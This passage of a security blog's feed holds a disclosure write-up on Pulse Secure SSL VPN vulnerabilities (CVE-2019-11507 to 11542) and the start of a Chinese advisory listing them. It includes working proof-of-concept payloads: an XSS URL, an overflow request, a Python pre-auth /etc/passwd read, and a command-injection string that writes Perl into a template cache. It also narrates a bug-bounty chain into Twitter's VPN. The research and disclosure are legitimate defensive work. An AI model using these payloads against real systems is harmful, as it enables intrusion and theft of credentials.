            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;DSID&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;ReplaceContent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;cve-2019-11507-cross-site-scripting&quot;&gt;CVE-2019-11507: Cross-Site Scripting&lt;/h2&gt;

&lt;p&gt;There is a CRLF Injection in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana/home/cts_get_ica.cgi&lt;/code&gt;. Due to the injection, we can forge arbitrary HTTP headers and inject malicious HTML contents.&lt;/p&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://sslvpn/dana/home/cts_get_ica.cgi
?bm_id=x
&amp;amp;vdi=1
&amp;amp;appname=aa%0d%0aContent-Type::text/html%0d%0aContent-Disposition::inline%0d%0aaa:bb&amp;lt;svg/onload=alert(document.domain)&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;cve-2019-11538-post-authuser-arbitrary-file-reading-via-nfs&quot;&gt;CVE-2019-11538: Post-auth(user) Arbitrary File Reading via NFS&lt;/h2&gt;

&lt;p&gt;The following two vulnerabilities (CVE-2019-11538 and CVE-2019-11508) do not affect default configurations. It appears only if the admin configures the NFS sharing for the VPN users.&lt;/p&gt;

&lt;p&gt;If an attacker can control any files on remote NFS server, he can just create a symbolic link to any file, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;, and read it from web interface. The root cause is that the implementation of NFS mounts the remote server as a real Linux directory, and the script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana/fb/nfs/nfb.cgi&lt;/code&gt; does not check whether the accessed file is a symlink or not!&lt;/p&gt;

&lt;h2 id=&quot;cve-2019-11508-post-authuser-arbitrary-file-writing-via-nfs&quot;&gt;CVE-2019-11508: Post-auth(user) Arbitrary File Writing via NFS&lt;/h2&gt;

&lt;p&gt;This one is a little bit similar to the previous one, but with a different attack vector!&lt;/p&gt;

&lt;p&gt;When the attacker uploads a ZIP file to the NFS through the web interface, the script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana/fb/nfs/nu.cgi&lt;/code&gt; does not sanitize the filename in the ZIP. Therefore, an attacker can build a malicious ZIP file and traverse the path with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../&lt;/code&gt; in the filename! Once Pulse Secure decompresses, the attacker can upload whatever he wants to whatever path!&lt;/p&gt;

&lt;h2 id=&quot;cve-2019-11542-post-authadmin-stack-buffer-overflow&quot;&gt;CVE-2019-11542: Post-auth(admin) Stack Buffer Overflow&lt;/h2&gt;

&lt;p&gt;There is a stack-based buffer overflow in the following Perl module implementations:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;DSHC::ConsiderForReporting&lt;/li&gt;
  &lt;li&gt;DSHC::isSendReasonStringEnabled&lt;/li&gt;
  &lt;li&gt;DSHC::getRemedCustomInstructions&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These implementations use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sprintf&lt;/code&gt; to concatenate strings without any length check, which leads to the buffer overflow. The bug can be triggered in many places, but here we use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana-admin/auth/hc.cgi&lt;/code&gt; as our PoC.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://sslvpn/dana-admin/auth/hc.cgi
?platform=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&amp;amp;policyid=0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And you can observed the segment fault from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dmesg&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cgi-server[22950]: segfault at 61616161 ip 0000000002a80afd sp 00000000ff9a4d50 error 4 in DSHC.so[2a2f000+87000]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;cve-2019-11510-pre-auth-arbitrary-file-reading&quot;&gt;CVE-2019-11510: Pre-auth Arbitrary File Reading&lt;/h2&gt;

&lt;p&gt;Actually, this is the most severe bug in this time. It is in the web server implementation. As our slides mentioned, Pulse Secure implements their own web server and architecture stack from scratch. The original path validation is very strict. However, since version 8.2, Pulse Secure introduced a new feature called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTML5 Access&lt;/code&gt;, it’s a feature used to interact with Telnet, SSH, and RDP by browsers. Thanks to this new feature, the original path validation becomes loose.&lt;/p&gt;

&lt;p&gt;In order to handle the static resources, Pulse Secure created a new IF-CONDITION to widen the originally strict path validation. The code wrongly uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request-&amp;gt;uri&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request-&amp;gt;filepath&lt;/code&gt;, so that we can specify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana/html5acc/guacamole/&lt;/code&gt; in the end of the query string to bypass the validation and make &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request-&amp;gt;filepath&lt;/code&gt; to any file you want to download!&lt;/p&gt;

&lt;p&gt;And it’s worth to mention that in order to read arbitrary files, you must to specify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana/html5acc/guacamole/&lt;/code&gt; in the middle of the path again. Otherwise, you can only download limited file extensions such as .json, .xml or .html.&lt;/p&gt;

&lt;p&gt;Due to the exploit is in the wild, there is no longer any concern to show the payload:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;https://sslvpn/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;cve-2019-11539-post-authadmin-command-injection&quot;&gt;CVE-2019-11539: Post-auth(admin) Command Injection&lt;/h2&gt;

&lt;p&gt;The last one is a command injection on the management interface. We found this vulnerability very early, but could not find a way to exploit it at first. While we were in Vegas, one of my friends told me that he found the same bug before, but he didn’t find a way to exploit it, so he didn’t report to the vendor.&lt;/p&gt;

&lt;p&gt;However, we did it, and we exploit it in a very smart way :)&lt;/p&gt;

&lt;p&gt;The root cause of this vulnerability is very simple. Here is a code fragment of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana-admin/diag/diag.cgi&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;tcpdump_options_syntax_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;CGI::&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;));&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;sub &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;tcpdump_options_syntax_check&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shift&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$options&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$TCPDUMP_COMMAND&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -d &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$options&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;undef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It’s so obvious and straightforward that everyone can point out there is a command injection at the parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;options&lt;/code&gt;! However, is it that easy? No!&lt;/p&gt;

&lt;p&gt;In order to avoid potential vulnerabilities, Pulse Secure applies lots of hardenings on their products! Such as the system integrity check, read-only filesystem and a module to hook all dangerous Perl invocations like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;open&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backtick&lt;/code&gt;…&lt;/p&gt;

&lt;p&gt;This module is called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DSSAFE.pm&lt;/code&gt;. It implements its own command line parser and re-implements the I/O redirections in Perl. Here is &lt;a href=&quot;https://gist.github.com/orangetw/d8df11b147629bb320e7db903c7e7147&quot;&gt;the code fragments on Gist&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;From the code fragments, you can see it replaces the original &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; and do lots of checks in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__parsecmd&lt;/code&gt;. It also blocks numerous bad characters such as:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[\&amp;amp;\*\(\)\{\}\[\]\`\;\|\?\n~&amp;lt;&amp;gt;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The checks are very strict so that we can not perform any command injection. We imagined several ways to bypass that, and the first thing came out of my mind is the argument injection. We listed all arguments that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCPDUMP&lt;/code&gt; supports and found that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-z postrotate-command&lt;/code&gt; may be useful. But the sad thing is that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCPDUMP&lt;/code&gt; in Pulse Secure is too old(v3.9.4, Sept 2005) to support this juicy feature, so we failed :(&lt;/p&gt;

&lt;p&gt;While examining the system, we found that although the webroot is read-only, we can still abuse the cache mechanism. Pulse Secure caches the template result in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/data/runtime/tmp/tt/&lt;/code&gt; to speed up script rendering. So our next attempt is to write a file into the template cache directory via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-w write-file&lt;/code&gt; argument. However, it seems impossible to write a polyglot file in both PCAP and Perl format.&lt;/p&gt;

&lt;p&gt;As it seems we had reached the end of argument injection, we tried to dig deeper into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DSSFAFE.pm&lt;/code&gt; implementation to see if there is anything we can leverage. Here we found a defect in the command line parser. If we insert an incomplete I/O redirection, the rest of the redirection part will be truncated. Although this is a tiny flaw, it helped us to re-control the I/O redirections! However, the problem that we can’t generate a valid Perl script still bothered us.&lt;/p&gt;

&lt;p&gt;We got stuck here, and it’s time to think out of the box. It’s hard to generate a valid Perl script via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STDOUT&lt;/code&gt;, could we just write the Perl by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STDERR&lt;/code&gt;? The answer is yes. When we force the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCPDUMP&lt;/code&gt; to read a nonexistent-file via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-r read-file&lt;/code&gt;. It shows the error:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;tcpdump: [filename]: No such file or directory&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It seems we can “&lt;strong&gt;partially&lt;/strong&gt;” control the error message. Then we tried the filename &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;print 123#&lt;/code&gt;, and the magic happens!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print 123#&apos;&lt;/span&gt;
  tcpdump: print 123#: No such file or directory
 
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print 123#&apos;&lt;/span&gt; 2&amp;gt;&amp;amp;1 | perl –
  123
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The error message becomes a valid Perl script now. Why? OK, let’s have a Perl 101 lesson now!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, Perl supports the GOTO label, so the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcpdump: &lt;/code&gt; becomes a valid label in Perl. Then, we comment the rest with a hashtag. With this creative trick, we can generate any valid Perl now!&lt;/p&gt;

&lt;p&gt;Finally, we use an incomplete I/O symbol &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt; to fool the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DSSAFE.pm&lt;/code&gt; command parser and redirect the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STDERR&lt;/code&gt; into the cache directory! Here is the final exploit:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-r$x=&quot;ls /&quot;,system$x# 2&amp;gt;/data/runtime/tmp/tt/setcookie.thtml.ttc &amp;lt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The concatenated command looks like:&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/sbin/tcpdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; 
 &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;$x=&quot;ls /&quot;,system$x#&apos;&lt;/span&gt;
 2&amp;gt;/data/runtime/tmp/tt/setcookie.thtml.ttc &amp;lt; 
 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
 2&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And the generated &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setcookie.thtml.ttc&lt;/code&gt; looks like:&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nv&quot;&gt;tcpdump:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ls /&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#: No such file or directory&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once we have done this, we can just fetch the corresponding page to execute our command:&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://sslvpn/dana-na/auth/setcookie.cgi
 boot  bin  home  lib64       mnt      opt  proc  sys  usr  var
 data  etc  lib   lost+found  modules  pkg  sbin  tmp 
 ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So far, the whole technical part of this command injection is over. However, we think there may be another creative way to exploit this, if you found one, please tell me!&lt;/p&gt;

&lt;h1 id=&quot;the-case-study&quot;&gt;The Case Study&lt;/h1&gt;

&lt;p&gt;After Pulse Secure patched all the bugs on &lt;strong&gt;April 24, 2019&lt;/strong&gt;. We kept monitoring the Internet to measure the response time of each large corporation. Twitter is one of them. They are known for their &lt;a href=&quot;http://hackerone.com/twitter&quot;&gt;bug bounty program&lt;/a&gt; and nice to hackers. However, it’s improper to exploit a 1-day right after the patch released. So we wait 30 days for Twitter to upgrade their SSL VPN.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We have to say, we were nervous during that time. The first thing we did every morning is to check whether Twitter upgrades their SSL VPN or not! It was an unforgettable time for us :P&lt;/p&gt;

&lt;p&gt;We started to hack Twitter on &lt;strong&gt;May 28, 2019&lt;/strong&gt;. During this operation, we encounter several obstacles. The first one is, although we can obtain the plaintext password of Twitter staffs, we still can’t log into their SSL VPN because of the Two Factor Authentication. Here we suggest two ways to bypass that. The first one is that we observed Twitter uses the solution from &lt;a href=&quot;https://duo.com&quot;&gt;Duo&lt;/a&gt;. The &lt;a href=&quot;https://duo.com/docs/pulseconnect&quot;&gt;manual&lt;/a&gt; mentions:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The security of your Duo application is tied to the security of your secret key (skey). Secure it as you would any sensitive credential. Don’t share it with unauthorized individuals or email it to anyone under any circumstances!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So if we can extract the secret key from the system, we can leverage the Duo API to bypass the 2FA. However, we found a quicker way to bypass it. Twitter enabled the &lt;a href=&quot;https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB30329&quot;&gt;Roaming Session&lt;/a&gt; feature, which is used to enhances mobility and allows a session from multiple IP locations.&lt;/p&gt;

&lt;p&gt;Due to this “&lt;strong&gt;convenient&lt;/strong&gt;” feature, we can just download the session database and forge our cookies to log into their system!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Until now, we are able to access Twitter Intranet. Nevertheless, our goal is to achieve code execution! It sounds more critical than just accessing the Intranet. So we would like to chain our command injection bug(CVE-2019-11539) together. OK, here, we encountered another obstacle. It’s the restricted management interface!&lt;/p&gt;

&lt;p&gt;As we mentioned before, our bug is on the management interface. But for the security consideration, most of the corporation disable this interface on public, so we need another way to access the admin page. If you have read our previous article carefully, you may recall the “&lt;strong&gt;WebVPN&lt;/strong&gt;” feature! WebVPN is a proxy which helps to connect to anywhere. So, let’s connect to itself.&lt;/p&gt;

&lt;p&gt;Yes, it’s SSRF! &lt;br /&gt;&lt;br /&gt;Here we use a small trick to bypass the SSRF protections.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahha! Through our SSRF, we can touch the interface now! Then, the last obstacle popped up. We didn’t have any plaintext password of managers. When Perl wants to exchange data with native procedures, such as the Perl extension in C++ or web server, it uses the cache to store data. The problem is, Pulse Secure forgets to clear the sensitive data after exchange, so that’s why we can obtain plaintext passwords in the cache. But practically, most of the managers only log into their system for the first time, so it’s hard to get the manager’s plaintext password. The only thing we got, is the password hash in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sha256(md5_crypt(salt, …))&lt;/code&gt; format…&lt;/p&gt;

&lt;p&gt;If you are experienced in cracking hashes, you will know how hard it is. So…&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;We launched a 72 core AWS to crack that.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We cracked the hash and got the RCE successfully! I think we are lucky because from our observation, there is a very strong password policy on Twitter staffs. But it seems the policy is not applied to the manager. The manager’s password length is only ten, and the first character is &lt;strong&gt;B&lt;/strong&gt;. It’s at a very early stage of our cracking queue so that we can crack the hash in 3 hours.&lt;/p&gt;

&lt;p&gt;We reported all of our findings to Twitter and got the highest bounty from them. Although we can not prove that, it seems this is the first remote code execution on Twitter! If you are interested in the full report, you can check the &lt;a href=&quot;https://hackerone.com/reports/591295&quot;&gt;HackerOne link&lt;/a&gt; for more details.&lt;/p&gt;

&lt;h1 id=&quot;recommendations&quot;&gt;Recommendations&lt;/h1&gt;

&lt;p&gt;How to mitigate such attacks? Here we give several recommendations.&lt;/p&gt;

&lt;p&gt;The first is the Client-Side Certificate. It’s also the most effective method. Without a valid certificate, the malicious connection will be dropped during SSL negotiation! The second is the Multi-factor Authentication. Although we break the Twitter 2FA this time, with a proper setting, the MFA can still decrease numerous attack surface. Next, enable the full log audit and remember to send to an out-bound log server.&lt;/p&gt;

&lt;p&gt;Also, perform your corporate asset inventory regularly and subscribe to the vendor’s security advisory. The most important of all, always keep your system updated!&lt;/p&gt;

&lt;h1 id=&quot;bonus-take-over-all-the-vpn-clients&quot;&gt;Bonus: Take over all the VPN clients&lt;/h1&gt;

&lt;p&gt;Our company, &lt;a href=&quot;https://devco.re/&quot;&gt;DEVCORE&lt;/a&gt;, provides the most professional red team service in Asia. In this bonus part, let’s talk about how to make the red team more &lt;strong&gt;RED&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;We always know that in a red team operation, the personal computer is more valuable! There are several old-school methods to compromise the VPN clients through SSL VPN before, such as the water-hole attack and replacing the VPN agent.&lt;/p&gt;

&lt;p&gt;During our research, we found a new attack vector to take over all the clients. It’s the “&lt;strong&gt;logon script&lt;/strong&gt;” feature. It appears in almost EVERY SSL VPNs, such as OpenVPN, Fortinet, Pulse Secure… and more. It can execute corresponding scripts to mount the network file-system or change the routing table once the VPN connection established.&lt;/p&gt;

&lt;p&gt;Due to this “&lt;strong&gt;hacker-friendly&lt;/strong&gt;” feature, once we got the admin privilege, we can leverage this feature to infect all the VPN clients! Here we use the Pulse Secure as an example, and demonstrate how to not only compromise the SSL VPN but also take over all of your connected clients:&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/v7JUMb70ON4&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h1 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h1&gt;

&lt;p&gt;OK, here is the end of this Attacking SSL VPN series! From our findings, SSL VPN is such a huge attack surface with few security researchers digging into. Apparently, it deserves more attention. We hope this kind of series can encourage other researchers to engage in this field and enhance the security of enterprises!&lt;/p&gt;

&lt;p&gt;Thanks to all guys we met, co-worked and cooperated. We will publish more innovative researches in the future :)&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/</link>
                <guid>https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study</guid>
                <pubDate>Mon, 02 Sep 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Pulse Secure SSL VPN 資安通報</title>
                <description>&lt;h3 id=&quot;內容&quot;&gt;內容&lt;/h3&gt;

&lt;p&gt;在我們對 Pulse Secure SSL VPN 的安全研究中，共發現了下列七個弱點。組合利用有機會取得 SSL VPN 設備的最高權限，可讓攻擊者進入用戶內網，甚至控制每個透過 SSL VPN 連線的使用者裝置。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2019-11510 - Pre-auth Arbitrary File Reading&lt;/li&gt;
  &lt;li&gt;CVE-2019-11542 - Post-auth(admin) Stack Buffer Overflow&lt;/li&gt;
  &lt;li&gt;CVE-2019-11539 - Post-auth(admin) Command Injection&lt;/li&gt;
  &lt;li&gt;CVE-2019-11538 - Post-auth(user) Arbitrary File Reading via NFS&lt;/li&gt;
  &lt;li&gt;CVE-2019-11508 - Post-auth(user) Arbitrary File Writing via NFS&lt;/li&gt;
  &lt;li&gt;CVE-2019-11540 - Post-auth Cross-Site Script Inclusion&lt;/li&gt;
  &lt;li&gt;CVE-2019-11507 - Post-auth Cross-Site Scripting&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;受影響的版本如下：&lt;/p&gt;

&lt;ul&gt;
